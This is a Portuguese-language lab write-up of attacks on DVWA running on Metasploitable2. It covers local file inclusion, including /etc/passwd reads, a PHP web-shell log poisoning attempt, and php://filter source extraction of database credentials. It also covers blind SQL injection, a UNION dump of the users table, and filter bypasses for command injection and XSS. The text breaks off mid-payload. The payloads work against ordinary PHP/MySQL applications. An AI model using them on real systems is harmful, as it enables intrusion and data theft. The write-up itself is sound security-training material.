# Writeup: DVWA - LFI, Blind SQLi e Bypasses de Nível Medium - Metasploitable2

## Ambiente
- Atacante: Kali Linux (VM VirtualBox)
- Alvo: DVWA (Damn Vulnerable Web App) rodando em Metasploitable2

---

## 1. Local File Inclusion (LFI)

**URL:** http://192.168.56.10/dvwa/vulnerabilities/fi/ | **Nível:** Low

### Leitura básica de arquivo
    ?page=/etc/passwd
Resultado: conteúdo completo de /etc/passwd exibido.

### Verificação de configuração PHP (via PHP Info)
    allow_url_fopen: On
    allow_url_include: Off
Como allow_url_include está desabilitado, RFI (Remote File
Inclusion via PHP hospedado remotamente) não é viável nesta
instância.

### Tentativa de Log Poisoning (não bem-sucedida)
Payload injetado via User-Agent do curl:
    curl -A "<?php system(\$_GET['cmd']); ?>" http://192.168.56.10/dvwa/
Tentativa de incluir os logs do Apache:
    ?page=/var/log/apache2/access.log  -> Permission denied
    ?page=/var/log/apache2/error.log   -> Permission denied
    ?page=/var/log/apache/access.log   -> No such file or directory
Conclusão: technique investigada sistematicamente mas não
aplicável nesta configuração — o processo www-data não possui
permissão de leitura sobre os arquivos de log do Apache.

### Extração de código-fonte via php://filter
    ?page=php://filter/convert.base64-encode/resource=/var/www/dvwa/config/config.inc.php
Resultado (decodificado de base64):
    $DBMS = 'MySQL';
    $_DVWA['db_server'] = 'localhost';
    $_DVWA['db_database'] = 'dvwa';
    $_DVWA['db_user'] = 'root';
    $_DVWA['db_password'] = '';
Confirma a credencial de banco (root sem senha) já identificada
no writeup de MySQL do Dia 1, agora extraída via código-fonte da
aplicação, sem exploração direta do banco.

### Leitura de arquivo de sessão PHP
Cookie de sessão obtido via `document.cookie`, usado para
incluir o próprio arquivo de sessão no servidor:
    ?page=/var/lib/php5/sess_<PHPSESSID>
Resultado: conteúdo serializado da sessão exposto
(`dvwa|a:2:{s:8:"messages";a:0:{}s:8:"username";s:5:"admin";}`),
confirmando a viabilidade de leitura de dados de sessão via LFI
(base para um possível ataque de Session Poisoning caso a
aplicação refletisse dados não sanitizados na sessão).

---

## 2. SQL Injection (Blind)

**URL:** http://192.168.56.10/dvwa/vulnerabilities/sqli_blind/ | **Nível:** Low

### Boolean-based
    1' AND '1'='1   -> resultado exibido (verdadeiro)
    1' AND '1'='2   -> nada exibido (falso)
Extração de caractere por comparação:
    1' AND SUBSTRING(database(),1,1)='d   -> verdadeiro
    1' AND SUBSTRING(database(),1,1)='x   -> falso

### Time-based
    1' AND SLEEP(5)-- -                     -> resposta demorada (~5s)
    1' AND SLEEP(5) AND '1'='2              -> resposta imediata
Confirma extração de dados possível mesmo sem qualquer diferença
visual de conteúdo na página, apenas pelo tempo de resposta.

---

## 3. Bypasses de filtro no nível Medium

Todos os testes abaixo foram realizados após elevar o DVWA
Security para Medium, testando se as proteções básicas
implementadas nesse nível são suficientes.

### SQL Injection — bypass de escape de aspas
Nível Medium aplica escape (`mysql_real_escape_string`), mas
apenas em torno de aspas simples:
    1'   -> erro de sintaxe (aspa escapada, não bloqueada)
Bypass: consulta original trata o ID como número, dispensando
aspas na injeção:
    1 UNION SELECT user, password FROM users-- -
Resultado: extração completa da tabela users, idêntica ao Low.

### Command Injection — bypass de blacklist de caracteres
    127.0.0.1; whoami    -> bloqueado (';' filtrado)
    127.0.0.1 | whoami   -> www-data (bypass com pipe)

### XSS Reflected — bypass de filtro de tag
Filtro remove a string `<script>` de forma ingênua (str_replace
não recursivo):
    <script>alert('XSS')</script>              -> bloqueado
    <scr<script>ipt>alert('XSS')</scr<script
